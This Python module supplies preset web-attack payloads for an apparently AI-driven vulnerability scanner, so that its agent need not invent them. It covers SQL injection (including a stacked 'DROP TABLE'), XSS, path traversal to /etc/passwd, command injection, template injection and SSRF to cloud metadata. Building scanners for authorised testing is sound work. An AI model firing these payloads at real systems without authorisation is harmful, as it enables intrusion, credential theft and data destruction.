"""
内置 Payload 库

为 SQLi / XSS / LFI / RCE / SSTI 提供参数化 payload 预设，
供 batch_inject 的 preset 参数直接调用。
Agent 不再需要现场编造 payload, 质量稳定且节省 LLM token。
"""

# ──── SQL Injection ────

SQLI_PAYLOADS: dict[str, list[dict]] = {
    "error_based": [
        {"payload": "'", "desc": "单引号闭合"},
        {"payload": '"', "desc": "双引号闭合"},
        {"payload": "1'", "desc": "数字型+单引号"},
        {"payload": "1') -- -", "desc": "括号闭合"},
        {"payload": "1')) -- -", "desc": "双层括号闭合"},
    ],
    "boolean_blind": [
        {"payload": "1 AND 1=1", "desc": "布尔真-数字"},
        {"payload": "1 AND 1=2", "desc": "布尔假-数字"},
        {"payload": "1' AND '1'='1", "desc": "布尔真-字符串"},
        {"payload": "1' AND '1'='2", "desc": "布尔假-字符串"},
        {"payload": "1' OR '1'='1", "desc": "OR 永真"},
    ],
    "time_blind": [
        {"payload": "1 AND SLEEP(5)-- -", "desc": "MySQL SLEEP"},
        {"payload": "1 AND BENCHMARK(5000000,MD5(1))--", "desc": "MySQL BENCHMARK"},
        {"payload": "1; SELECT pg_sleep(5)--", "desc": "PostgreSQL pg_sleep"},
        {"payload": "1 WAITFOR DELAY '0:0:5'--", "desc": "MSSQL WAITFOR"},
        {"payload": "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5) FROM DUAL--", "desc": "Oracle DBMS_PIPE"},
    ],
    "union_probe": [
        {"payload": "1 ORDER BY 1--+", "desc": "列数探测-1"},
        {"payload": "1 ORDER BY 5--+", "desc": "列数探测-5"},
        {"payload": "1 ORDER BY 10--+", "desc": "列数探测-10"},
        {"payload": "-1 UNION SELECT 1,2,3--+", "desc": "UNION 回显位"},
        {"payload": "-1 UNION SELECT 1,2,3,4,5--+", "desc": "UNION 回显位-5列"},
    ],
    "stacked": [
        {"payload": "1; DROP TABLE test--", "desc": "堆叠查询-DROP"},
        {"payload": "1; INSERT INTO test VALUES(1)--", "desc": "堆叠查询-INSERT"},
    ],
    "quick_scan": [
        {"payload": "'", "desc": "单引号"},
        {"payload": "1' OR '1'='1", "desc": "OR 永真"},
        {"payload": "1 AND SLEEP(3)-- -", "desc": "MySQL 时间(3s)"},
        {"payload": "1 AND 1=2", "desc": "布尔假"},
        {"payload": "-1 UNION SELECT 1,2,3--+", "desc": "UNION 探测"},
    ],
}

# ──── XSS ────

XSS_PAYLOADS: dict[str, list[dict]] = {
    "reflected": [
        {"payload": "<script>alert(1)</script>", "desc": "脚本标签"},
        {"payload": '"><img src=x onerror=alert(1)>', "desc": "img onerror"},
        {"payload": "<svg/onload=alert(1)>", "desc": "SVG onload"},
        {"payload": "'-alert(1)-'", "desc": "单引号闭合"},
        {"payload": "<details/open/ontoggle=alert(1)>", "desc": "details toggle"},
    ],
    "dom_based": [
        {"payload": "#<img src=x onerror=alert(1)>", "desc": "hash XSS"},
        {"payload": "javascript:alert(1)", "desc": "javascript URI"},
        {"payload": "\"+alert(1)+\"", "desc": "JS 字符串闭合"},
    ],
    "quick_scan": [
        {"payload": "<script>alert(1)</script>", "desc": "基础脚本"},
        {"payload": '"><img src=x onerror=alert(1)>', "desc": "IMG 逃逸"},
        {"payload": "<svg/onload=alert(1)>", "desc": "SVG 逃逸"},
        {"payload": "'-alert(1)-'", "desc": "单引号"},
    ],
}

# ──── LFI / Path Traversal ────

LFI_PAYLOADS: dict[str, list[dict]] = {
    "linux": [
        {"payload": "../../../etc/passwd", "desc": "经典遍历"},
        {"payload": "....//....//....//etc/passwd", "desc": "双写绕过"},
        {"payload": "..%2f..%2f..%2fetc%2fpasswd", "desc": "URL编码"},
        {"payload": "..%252f..%252f..%252fetc%252fpasswd", "desc": "双URL编码"},
        {"payload": "/etc/passwd", "desc": "绝对路径"},
    ],
    "windows": [
        {"payload": "..\\..\\..\\windows\\win.ini", "desc": "Windows 遍历"},
        {"payload": "..%5c..%5c..%5cwindows%5cwin.ini", "desc": "URL编码"},
    ],
    "php_wrapper": [
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "php filter base64"},
        {"payload": "php://filter/read=convert.base64-encode/resource=../index.php", "desc": "php filter+遍历"},
        {"payload": "php://input", "desc": "php input"},
        {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "desc": "data wrapper"},
    ],
    "quick_scan": [
        {"payload": "../../../etc/passwd", "desc": "Linux 遍历"},
        {"payload": "..%2f..%2f..%2fetc%2fpasswd", "desc": "URL编码"},
        {"payload": "php://filter/convert.base64-encode/resource=index", "desc": "PHP filter"},
        {"payload": "....//....//....//etc/passwd", "desc": "双写绕过"},
    ],
}

# ──── RCE / Command Injection ────

RCE_PAYLOADS: dict[str, list[dict]] = {
    "linux": [
        {"payload": ";id", "desc": "分号+id"},
        {"payload": "|id", "desc": "管道+id"},
        {"payload": "$(id)", "desc": "命令替换"},
        {"payload": "`id`", "desc": "反引号"},
        {"payload": "&& id", "desc": "AND 链"},
        {"payload": "|| id", "desc": "OR 链"},
    ],
    "windows": [
        {"payload": "& whoami", "desc": "AND 链"},
        {"payload": "| whoami", "desc": "管道"},
        {"payload": "&& dir C:\\", "desc": "AND 链+dir"},
    ],
    "time_blind": [
        {"payload": "; sleep 5", "desc": "分号+sleep时间盲注"},
        {"payload": "| sleep 5", "desc": "管道+sleep"},
        {"payload": "$(sleep 5)", "desc": "命令替换+sleep"},
        {"payload": "`sleep 5`", "desc": "反引号+sleep"},
        {"payload": "&& sleep 5", "desc": "链式+sleep"},
        {"payload": "|| sleep 5", "desc": "OR链+sleep"},
    ],
    "ping_context": [
        {"payload": "127.0.0.1; id", "desc": "IP前缀+分号+id"},
        {"payload": "127.0.0.1 | id", "desc": "IP前缀+管道+id"},
        {"payload": "127.0.0.1; sleep 5", "desc": "IP前缀+分号+sleep盲注"},
        {"payload": "127.0.0.1 | sleep 5", "desc": "IP前缀+管道+sleep盲注"},
        {"payload": "127.0.0.1 && id", "desc": "IP前缀+链式+id"},
    ],
    "quick_scan": [
        {"payload": ";id", "desc": "Linux id"},
        {"payload": "|id", "desc": "Linux pipe"},
        {"payload": "$(id)", "desc": "命令替换"},
        {"payload": "`id`", "desc": "反引号"},
        {"payload": "&& whoami", "desc": "链式 whoami"},
        {"payload": "; sleep 5", "desc": "时间盲注-分号"},
        {"payload": "| sleep 5", "desc": "时间盲注-管道"},
        {"payload": "127.0.0.1; sleep 5", "desc": "IP前缀时间盲注-分号"},
        {"payload": "127.0.0.1 | sleep 5", "desc": "IP前缀时间盲注-管道"},
    ],
}

# ──── SSTI ────

SSTI_PAYLOADS: dict[str, list[dict]] = {
    "quick_scan": [
        {"payload": "{{7*7}}", "desc": "Jinja2/Twig"},
        {"payload": "${7*7}", "desc": "Freemarker"},
        {"payload": "#{7*7}", "desc": "Ruby ERB"},
        {"payload": "<%= 7*7 %>", "desc": "EJS"},
        {"payload": "{{config}}", "desc": "Flask config"},
    ],
}

# ──── SSRF ────

SSRF_PAYLOADS: dict[str, list[dict]] = {
    "quick_scan": [
        {"payload": "http://127.0.0.1:80", "desc": "localhost"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "desc": "AWS metadata"},
        {"payload": "http://[::1]:80", "desc": "IPv6 localhost"},
        {"payload": "file:///etc/passwd", "desc": "file protocol"},
    ],
}

# ──── 预设索引 ────

ALL_PRESETS: dict[str, dict] = {
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "lfi": LFI_PAYLOADS,
    "rce": RCE_PAYLOADS,
    "ssti": SSTI_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
}


def get_payloads(vuln_type: str, preset: str = "quick_scan") -> list[str]:
    """获取指定漏洞类型和预设的 payload 列表"""
    # v27: quick_scan 优先使用统一框架的分阶段载荷
    if preset == "quick_scan":
        try:
            from .vuln_detection_framework import get_staged_payloads
            staged = get_staged_payloads(vuln_type)
            if staged:
                return staged
        except ImportError:
            pass
    # 回退到原来定义
    category = ALL_PRESETS.get(vuln_type, {})
    items = category.get(preset, category.get("quick_scan", []))
    return [item["payload"] for item in items]


def get_preset_for_vuln_type(vuln_type: str) -> str:
    """根据 vuln_type 推荐最佳 preset"""
    mapping = {
        "sql_injection": "sqli",
        "xss": "xss",
        "lfi": "lfi",
        "path_traversal": "lfi",
        "rce": "rce",
        "ssti": "ssti",
        "ssrf": "ssrf",
    }
    return mapping.get(vuln_type, "sqli")
